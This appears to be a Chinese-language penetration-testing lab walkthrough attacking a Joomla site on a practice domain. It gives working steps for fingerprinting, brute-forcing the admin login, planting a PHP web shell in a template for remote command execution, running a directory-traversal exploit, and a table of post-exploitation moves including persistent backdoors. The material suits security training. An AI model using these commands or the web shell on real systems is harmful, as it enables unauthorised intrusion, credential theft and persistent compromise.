# Joolmla

## <mark style="color:red;">**1. 發現點**</mark>

#### 1️⃣ 確認目標係 Joomla：

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

出現：

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

代表已確認用 Joomla！



## <mark style="color:red;">**2. 測試Payload**</mark>

* 嘗試存取 README.txt：

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

* 查看 XML 文件：

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

> 找到 `<version>3.9.4</version>`，代表使用 Joomla 3.9.4

* 使用 droopescan：

```bash
droopescan scan joomla --url http://dev.inlanefreight.local
```

> 可列出版本範圍、Login 頁面、License.txt 文件

* （可選）Joomlascan：

<pre class="language-bash"><code class="lang-bash"><strong>python2.7 joomlascan.py -u http://dev.inlanefreight.local
</strong></code></pre>

> 幫助尋找開放目錄或可能漏洞。

## <mark style="color:red;">3.</mark> 暴力破解登入

* Joomla 預設管理員帳號通常為 `admin`
* 使用 `joomla-brute.py` 爆破登入：

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

成功結果：

```
admin:admin
```

> 拎到帳號同密碼後直接登入後台：

```
http://dev.inlanefreight.local/administrator/index.php
```

## <mark style="color:red;">4.</mark> 濫用後台功能取得 RCE

\


> 登入成功後，我地可以利用客製化模板來寫 WebShell

#### 1️⃣ 解除插件錯誤

若後台報錯「發生錯誤。在 null 上呼叫成員函數 format()」

* 進入：

```
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

* 停用 `快速圖示 - PHP 版本檢查`

#### 2️⃣ 編輯模板

* 左邊點擊「Templates」
* 選 `protostar` > `Customize`
* 點擊 `error.php`
* 加入 payload：

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

* Save & Close

#### 3️⃣ 執行RCE測試：

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

出現：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

代表成功取得 shell。

## <mark style="color:red;">4.已知漏洞利用</mark>

* Joomla 核心漏洞唔多，大部分係插件漏洞。
* 你可以用 exploit-db 搜 `joomla`，再配合版本進行篩選。
* 常見可利用漏洞包括：
  * 路徑穿越 (Directory Traversal)
  * SQL Injection
  * RCE 通過第三方擴展

例如：

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

> 如果成功，可以下載任意路徑文件。

## <mark style="color:red;">5. 連鎖漏洞</mark>

如果已經進入 Joomla 後台或者已經有RCE，可以繼續進行以下行動：

| 階段    | 攻擊行動                                              |
| ----- | ------------------------------------------------- |
| 提權    | 嘗試 `sudo -l`、找 SUID 文件、弱權限服務提權                    |
| 横向移動  | 掃描內網：`netstat -an`、`nmap -sn` 探索有冇其他主機            |
| 密碼回收  | 查看 `configuration.php` 裏面有冇數據庫密碼 / 或其他帳密洩露        |
| 持久化後門 | 再寫 shell 落 `/images` 或 `modules`，並放置後門連線          |
| 秘密蒐集  | `find / -name "*flag*"` 或 \`find / -name "\*.txt" |
